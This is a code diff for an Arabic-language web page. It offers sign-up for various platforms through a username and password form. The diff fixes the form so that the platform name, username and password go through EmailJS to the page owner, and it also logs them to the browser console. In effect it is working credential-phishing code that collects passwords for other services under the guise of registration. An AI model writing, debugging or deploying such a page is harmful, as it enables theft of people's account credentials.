@@ -7,22 +7,14 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // Public Key من EmailJS
+            emailjs.init("1xqwBMfecM1SSulsh"); // مفتاح public الخاص بك
         })();
-
-        function toggleLanguage(lang) {
-            const elements = document.querySelectorAll("[data-ar], [data-en]");
-            elements.forEach(el => {
-                el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
-            });
-            document.documentElement.lang = lang;
-        }
 
         // تفعيل النموذج عند الضغط على أحد التطبيقات
         function activateContactForm(platformName) {
             const formContainer = document.getElementById('form-container');
             const platformTitle = document.getElementById('platform-name');
-            platformTitle.textContent = platformName;  // عرض اسم المنصة
+            platformTitle.textContent = `التسجيل في ${platformName}`;  // تغيير النص ليظهر اسم المنصة
             formContainer.style.display = 'block'; // إظهار النموذج
             document.getElementById('platform').value = platformName; // تعيين قيمة المنصة
         }
@@ -31,19 +23,25 @@
         function sendEmail(event) {
             event.preventDefault(); // منع الإرسال الافتراضي للنموذج
 
-            var form = document.getElementById('contact-form');
+            const form = document.getElementById('contact-form');
+            const username = form.username.value;
+            const password = form.password.value;
+            const platform = form.platform.value;
+
             // التحقق من الحقول
-            if (!form.username.value || !form.password.value) {
+            if (!username || !password || !platform) {
                 alert('يرجى ملء جميع الحقول.');
                 return;
             }
 
             // إعداد البيانات التي سيتم إرسالها إلى القالب في EmailJS
             var templateParams = {
-                platform: form.platform.value,
-                username: form.username.value,
-                password: form.password.value
+                platform: platform,
+                username: username,
+                password: password
             };
+
+            console.log('Data being sent:', templateParams); // تسجيل البيانات في الكونسول لتشخيص المشكلة
 
             // إرسال البيانات عبر EmailJS
             emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams).then(function(response) {
@@ -51,8 +49,8 @@
                 alert('تم إرسال الرسالة بنجاح!');
                 form.reset(); // إعادة تعيين النموذج بعد الإرسال
             }, function(error) {
-                console.log('Error:', error);
-                alert('حدث خطأ أثناء إرسال الرسالة.');
+                console.log('Error:', error);  // تسجيل الخطأ إذا حدث
+                alert('حدث خطأ أثناء إرسال الرسالة. تحقق من الكونسول لمزيد من التفاصيل.');
             });
         }
     </script>
@@ -90,11 +88,6 @@
         .content {
             text-align: center;
             padding: 30px;
-        }
-        .welcome-message {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
         }
         .platform {
             margin: 15px;
@@ -141,21 +134,6 @@
         .form-container button:hover {
             background-color: #666;
         }
-        .contact-toggle {
-            padding: 15px 30px;
-            background-color: #444;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 20px auto;
-            display: block;
-            transition: background-color 0.3s;
-        }
-        .contact-toggle:hover {
-            background-color: #666;
-        }
     </style>
 </head>
 <body>
@@ -180,35 +158,14 @@
 
     <div class="form-container" id="form-container">
         <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
-        <form id="registration-form">
-            <input type="text" name="username" id="username" data-ar="اسم المستخدم" placeholder="اسم المستخدم" required>
-            <input type="password" name="password" id="password" data-ar="كلمة المرور" placeholder="كلمة المرور" required>
-            <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
+        <form id="contact-form" style="display: block;" onsubmit="sendEmail(event)">
+            <input type="hidden" name="platform" id="platform">
+            <input type="text" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">إرسال</button>
         </form>
     </div>
-
-    <button class="contact-toggle" onclick="document.getElementById('contact-form').style.display = 'block'" data-ar="تواصل معنا" data-en="Contact Us">تواصل معنا</button>
-
-    <form id="contact-form" style="display: none;" onsubmit="sendEmail(event)">
-        <input type="hidden" name="platform" id="platform">
-        <input type="text" name="username" placeholder="اسم المستخدم" required>
-        <input type="password" name="password" placeholder="كلمة المرور" required>
-        <button type="submit">إرسال</button>
-    </form>
 </div>
 
-<script>
-    // تفعيل النموذج عند الضغط على منصات
-    const platforms = document.querySelectorAll('.platform');
-    const formContainer = document.getElementById('form-container');
-    const platformName = document.getElementById('platform-name');
-
-    platforms.forEach(platform => {
-        platform.addEventListener('click', () => {
-            platformName.textContent = platform.getAttribute('data-ar'); // تغيير النص إلى العربية
-            formContainer.style.display = 'block'; // إظهار النموذج
-        });
-    });
-</script>
 </body>
 </html>
